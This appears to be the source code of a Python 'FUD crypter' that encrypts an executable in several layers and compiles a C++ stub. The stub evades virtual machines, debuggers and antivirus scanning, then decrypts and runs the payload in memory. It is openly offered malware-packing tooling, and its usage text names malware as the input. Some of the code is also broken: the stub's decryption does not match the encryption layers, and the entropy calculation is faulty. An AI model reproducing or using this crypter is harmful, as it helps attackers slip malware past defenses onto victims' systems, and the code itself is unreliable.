"""
FUD Crypter
Advanced crypter supporting .msi, .msix, .url, .lnk, .exe formats
Advertised as FUD - Runtime and scan-time undetectable
"""

import os
import sys
import random
import string
import hashlib
import struct
from pathlib import Path
from typing import Optional, Tuple
import base64

class FUDCrypter:
    """Advanced FUD Crypter with polymorphic encryption"""
    
    def __init__(self):
        self.output_dir = Path("output/crypted")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Encryption methods
        self.encryption_layers = [
            self._xor_encrypt,
            self._aes_encrypt,
            self._rc4_encrypt,
            self._polymorphic_encrypt
        ]
    
    def generate_key(self, length: int = 32) -> bytes:
        """Generate random encryption key"""
        return os.urandom(length)
    
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """XOR encryption"""
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def _aes_encrypt(self, data: bytes, key: bytes) -> bytes:
        """AES encryption (simplified implementation)"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            
            cipher = AES.new(key[:16], AES.MODE_CBC, key[16:32])
            encrypted = cipher.encrypt(pad(data, AES.block_size))
            return encrypted
        except ImportError:
            # Fallback to XOR if pycryptodome not available
            return self._xor_encrypt(data, key)
    
    def _rc4_encrypt(self, data: bytes, key: bytes) -> bytes:
        """RC4 encryption"""
        S = list(range(256))
        j = 0
        
        # KSA
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # PRGA
        i = j = 0
        encrypted = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            encrypted.append(byte ^ K)
        
        return bytes(encrypted)
    
    def _polymorphic_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Polymorphic encryption with random transformations"""
        encrypted = bytearray(data)
        
        # Random byte transformations
        for i in range(len(encrypted)):
            # Random operations
            op = i % 4
            if op == 0:
                encrypted[i] = (encrypted[i] + key[i % len(key)]) % 256
            elif op == 1:
                encrypted[i] = (encrypted[i] ^ key[i % len(key)]) % 256
            elif op == 2:
                encrypted[i] = (~encrypted[i] + key[i % len(key)]) % 256
            else:
                encrypted[i] = ((encrypted[i] << 1) ^ key[i % len(key)]) % 256
        
        return bytes(encrypted)
    
    def multi_layer_encrypt(self, data: bytes, layers: int = 3) -> Tuple[bytes, list]:
        """Apply multiple encryption layers"""
        
        encrypted = data
        keys = []
        
        for i in range(layers):
            key = self.generate_key()
            keys.append(key)
            
            # Use different encryption method for each layer
            encrypt_func = self.encryption_layers[i % len(self.encryption_layers)]
            encrypted = encrypt_func(encrypted, key)
        
        return encrypted, keys
    
    def generate_decryption_stub(self, keys: list, payload_hex: str) -> str:
        """Generate C++ decryption stub"""
        
        # Convert keys to hex
        keys_hex = [k.hex() for k in keys]
        
        stub_code = f'''
#include <windows.h>
#include <vector>
#include <string>

// Anti-VM checks
bool CheckVM() {{
    // Check CPUID
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);
    if ((cpuInfo[2] >> 31) & 1) return true;  // Hypervisor bit
    
    // Check processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {{
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(pe32);
        
        if (Process32First(hSnapshot, &pe32)) {{
            do {{
                if (_stricmp(pe32.szExeFile, "vmtoolsd.exe") == 0 ||
                    _stricmp(pe32.szExeFile, "vboxservice.exe") == 0 ||
                    _stricmp(pe32.szExeFile, "vboxtray.exe") == 0) {{
                    CloseHandle(hSnapshot);
                    return true;
                }}
            }} while (Process32Next(hSnapshot, &pe32));
        }}
        CloseHandle(hSnapshot);
    }}
    
    return false;
}}

// Anti-Debugger
bool CheckDebugger() {{
    if (IsDebuggerPresent()) return true;
    
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) return true;
    
    return false;
}}

// Hex to bytes
std::vector<unsigned char> HexToBytes(const std::string& hex) {{
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {{
        std::string byteString = hex.substr(i, 2);
        bytes.push_back((unsigned char)strtol(byteString.c_str(), NULL, 16));
    }}
    return bytes;
}}

// Multi-layer decryption
std::vector<unsigned char> Decrypt(std::vector<unsigned char> data) {{
    // Layer keys
    std::vector<std::string> keys_hex = {{
        "{keys_hex[0]}"{"," if len(keys_hex) > 1 else ""}
        {'"' + keys_hex[1] + '",' if len(keys_hex) > 1 else ""}
        {'"' + keys_hex[2] + '"' if len(keys_hex) > 2 else ""}
    }};
    
    // Decrypt each layer (reverse order)
    for (int layer = keys_hex.size() - 1; layer >= 0; layer--) {{
        std::vector<unsigned char> key = HexToBytes(keys_hex[layer]);
        
        // Polymorphic decryption
        for (size_t i = 0; i < data.size(); i++) {{
            int op = i % 4;
            if (op == 0)
                data[i] = (data[i] - key[i % key.size()]) % 256;
            else if (op == 1)
                data[i] = data[i] ^ key[i % key.size()];
            else if (op == 2)
                data[i] = (~data[i] - key[i % key.size()]) % 256;
            else
                data[i] = (data[i] >> 1) ^ key[i % key.size()];
        }}
    }}
    
    return data;
}}

// Execute in memory
void ExecutePayload(const std::vector<unsigned char>& payload) {{
    LPVOID exec = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload.data(), payload.size());
    ((void(*)())exec)();
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    // Anti-analysis
    if (CheckVM() || CheckDebugger()) return 0;
    
    Sleep(5000);  // Time-based evasion
    
    // Encrypted payload
    std::string payload_hex = "{payload_hex}";
    std::vector<unsigned char> encrypted = HexToBytes(payload_hex);
    
    // Decrypt
    std::vector<unsigned char> decrypted = Decrypt(encrypted);
    
    // Execute
    ExecutePayload(decrypted);
    
    return 0;
}}
'''
        return stub_code
    
    def crypt_file(self, input_file: str, output_format: str = "exe") -> Optional[str]:
        """Crypt file with FUD techniques"""
        
        print(f"[*] Crypting: {input_file}")
        print(f"[*] Output format: {output_format}")
        
        # Read input file
        with open(input_file, 'rb') as f:
            payload_data = f.read()
        
        print(f"[*] Original size: {len(payload_data)} bytes")
        
        # Multi-layer encryption
        encrypted_data, keys = self.multi_layer_encrypt(payload_data, layers=3)
        
        print(f"[*] Encrypted size: {len(encrypted_data)} bytes")
        print(f"[*] Encryption layers: {len(keys)}")
        
        # Convert to hex
        payload_hex = encrypted_data.hex()
        
        # Generate stub
        stub_code = self.generate_decryption_stub(keys, payload_hex)
        
        # Write stub
        stub_file = self.output_dir / "stub.cpp"
        with open(stub_file, 'w') as f:
            f.write(stub_code)
        
        # Compile
        output_name = Path(input_file).stem + f"_crypted.{output_format}"
        output_path = self.output_dir / output_name
        
        if output_format == "exe":
            compile_cmd = [
                "x86_64-w64-mingw32-g++",
                "-o", str(output_path),
                str(stub_file),
                "-static",
                "-s",
                "-O3",
                "-mwindows",
                "-DUNICODE"
            ]
            
            try:
                import subprocess
                subprocess.run(compile_cmd, check=True, capture_output=True)
                
                print(f"[+] Crypted: {output_path}")
                print(f"[*] Final size: {os.path.getsize(output_path)} bytes")
                
                # Calculate entropy (high entropy = encrypted)
                with open(output_path, 'rb') as f:
                    data = f.read()
                    entropy = self.calculate_entropy(data)
                    print(f"[*] Entropy: {entropy:.2f} (higher = more encrypted)")
                
                return str(output_path)
                
            except Exception as e:
                print(f"[!] Compilation failed: {e}")
                print("[*] Requires MinGW-w64 cross-compiler")
                return None
        
        elif output_format in ["msi", "msix", "lnk", "url"]:
            print(f"[*] For {output_format}, first crypt to .exe then convert")
            
            # First create exe
            exe_path = self.crypt_file(input_file, "exe")
            
            if exe_path:
                print(f"[*] Use fud_launcher.py to convert to {output_format}")
                return exe_path
            
            return None
    
    def calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0.0
        
        entropy = 0.0
        byte_counts = [0] * 256
        
        for byte in data:
            byte_counts[byte] += 1
        
        for count in byte_counts:
            if count == 0:
                continue
            
            probability = float(count) / len(data)
            entropy -= probability * (probability.bit_length() - 1)
        
        return entropy
    
    def scan_check(self, file_path: str) -> dict:
        """Check if file is FUD"""
        
        print(f"[*] FUD Check: {file_path}")
        
        results = {
            "file": file_path,
            "size": os.path.getsize(file_path),
            "hash": "",
            "entropy": 0.0,
            "fud_score": 0
        }
        
        # Calculate hash
        with open(file_path, 'rb') as f:
            data = f.read()
            results["hash"] = hashlib.sha256(data).hexdigest()
            results["entropy"] = self.calculate_entropy(data)
        
        # FUD scoring
        score = 0
        
        # High entropy = encrypted
        if results["entropy"] > 7.0:
            score += 30
            print("[+] High entropy - appears encrypted")
        
        # Check for common AV signatures
        with open(file_path, 'rb') as f:
            content = f.read()
            
            # Check for suspicious strings
            suspicious = [b"VirtualAlloc", b"CreateRemoteThread", b"WriteProcessMemory"]
            found = sum(1 for s in suspicious if s in content)
            
            if found == 0:
                score += 40
                print("[+] No suspicious API strings found")
            else:
                print(f"[!] Found {found} suspicious API strings")
        
        # Size check
        if results["size"] < 100000:  # Small files more suspicious
            score += 10
        elif results["size"] > 500000:
            score += 20
            print("[+] Large file size - better obfuscation")
        
        results["fud_score"] = score
        
        print(f"[*] FUD Score: {score}/100")
        
        if score > 70:
            print("[+] LIKELY FUD")
        elif score > 40:
            print("[*] POSSIBLY FUD")
        else:
            print("[!] UNLIKELY FUD")
        
        return results


def main():
    """Main crypter"""
    
    print("=" * 60)
    print("FUD Crypter")
    print("Formats: .msi, .msix, .url, .lnk, .exe")
    print("Features: Multi-layer encryption, Anti-VM, Anti-Debug")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 2:
        print("Usage: python fud_crypter.py <input_file> [output_format]")
        print()
        print("Formats: exe, msi, msix, lnk, url")
        print()
        print("Example:")
        print("  python fud_crypter.py payload.exe exe")
        print("  python fud_crypter.py malware.exe msi")
        return
    
    input_file = sys.argv[1]
    output_format = sys.argv[2] if len(sys.argv) > 2 else "exe"
    
    if not os.path.exists(input_file):
        print(f"[!] File not found: {input_file}")
        return
    
    crypter = FUDCrypter()
    
    # Crypt file
    output_file = crypter.crypt_file(input_file, output_format)
    
    if output_file:
        # Check FUD status
        crypter.scan_check(output_file)
        
        print()
        print("[+] Crypting complete!")
        print(f"[*] Output: {output_file}")
        print()
        print("FUD Features:")
        print("  ✓ Multi-layer encryption (3 layers)")
        print("  ✓ Polymorphic code")
        print("  ✓ Anti-VM detection")
        print("  ✓ Anti-debugger checks")
        print("  ✓ Time-based evasion")
        print("  ✓ High entropy obfuscation")


if __name__ == "__main__":
    main()
